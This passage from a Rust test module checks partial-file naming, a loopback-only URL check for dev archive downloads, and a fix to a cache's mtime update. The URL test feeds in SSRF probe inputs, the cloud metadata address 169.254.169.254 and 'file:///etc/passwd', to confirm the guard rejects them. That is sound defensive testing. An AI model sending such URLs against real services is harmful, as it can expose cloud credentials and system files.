                .and_then(|s| s.to_str())
                .map(|s| s.starts_with("myworker.partial."))
                .unwrap_or(false),
            "expected myworker.partial.* sibling, got {sib:?}"
        );
    }

    #[test]
    fn is_loopback_dev_archive_url_accepts_localhost_variants() {
        assert!(super::is_loopback_dev_archive_url(
            "http://localhost/foo.tar.gz"
        ));
        assert!(super::is_loopback_dev_archive_url(
            "http://localhost:8000/foo.tar.gz"
        ));
        assert!(super::is_loopback_dev_archive_url(
            "http://127.0.0.1:8000/foo.tar.gz"
        ));
        assert!(super::is_loopback_dev_archive_url(
            "https://localhost/foo.tar.gz"
        ));
        assert!(super::is_loopback_dev_archive_url(
            "http://[::1]/foo.tar.gz"
        ));
        assert!(super::is_loopback_dev_archive_url(
            "http://LOCALHOST:8000/x"
        ));
    }

    #[test]
    fn is_loopback_dev_archive_url_rejects_public_hosts() {
        // Anything that isn't the loopback trio stays on the strict
        // SSRF guard path.
        assert!(!super::is_loopback_dev_archive_url(
            "https://cdn.example.com/foo.tar.gz"
        ));
        assert!(!super::is_loopback_dev_archive_url(
            "https://10.0.0.1/foo.tar.gz"
        ));
        assert!(!super::is_loopback_dev_archive_url(
            "https://169.254.169.254/foo"
        ));
        assert!(!super::is_loopback_dev_archive_url("not a url"));
        assert!(!super::is_loopback_dev_archive_url("file:///etc/passwd"));
    }

    #[test]
    fn filetime_touch_actually_updates_mtime() {
        // Regression test for the previous no-op implementation that
        // made the LRU cache effectively FIFO-by-write-time. After
        // touch the file's mtime must reflect the supplied `now`.
        let tmp = tempfile::tempdir().expect("tempdir");
        let path = tmp.path().join("blob");
        std::fs::write(&path, b"hello").expect("write");
        let metadata = std::fs::metadata(&path).expect("metadata");

        // Pick a target time that's clearly different from any
        // filesystem-default value: 2030-01-01 00:00:00 UTC.
        let target = std::time::UNIX_EPOCH + std::time::Duration::from_secs(1_893_456_000);
        filetime_touch(&path, target, metadata).expect("touch ok");

        let after = std::fs::metadata(&path)
            .and_then(|m| m.modified())
            .expect("modified after");
        // Allow second-level rounding because some filesystems (e.g.
        // FAT32, default ext4 without nsec) only store seconds; the
        // assertion only needs to show we moved away from "now".
        let after_secs = after
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        assert_eq!(
            after_secs, 1_893_456_000,
            "expected mtime touched to target value, got {after_secs}"
        );
    }
}
